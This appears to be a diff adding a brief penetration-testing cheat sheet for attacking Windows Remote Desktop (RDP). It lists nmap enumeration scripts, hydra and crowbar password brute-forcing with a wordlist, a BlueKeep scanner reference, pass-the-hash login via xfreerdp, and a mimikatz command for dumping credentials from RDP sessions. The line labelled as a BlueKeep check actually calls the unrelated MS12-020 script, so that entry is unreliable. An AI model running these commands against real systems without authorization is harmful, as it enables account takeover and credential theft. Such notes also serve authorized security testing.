@@ -1,0 +1,26 @@
+RDP
+Nmap Scripts
+bashnmap --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-enum-encryption -p 3389 target
+nmap -sV --script rdp* -p 3389 target
+Tools
+bash# Check if NLA required
+nmap -p 3389 --script rdp-enum-encryption target
+
+# Brute force
+hydra -l administrator -P rockyou.txt rdp://target
+crowbar -b rdp -s target/32 -U users.txt -C pass.txt
+
+# BlueKeep check (CVE-2019-0708)
+nmap --script rdp-vuln-ms12-020 -p 3389 target
+# Metasploit: use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+
+# Connect
+xfreerdp /u:user /p:pass /v:target
+xfreerdp /u:user /p:pass /v:target /cert-ignore
+rdesktop target -u user -p pass
+
+# Pass the Hash via RDP (restricted admin mode)
+xfreerdp /u:admin /pth:NTLM_HASH /v:target
+
+# Dump creds from RDP sessions (if shell access)
+mimikatz # ts::logonpasswords
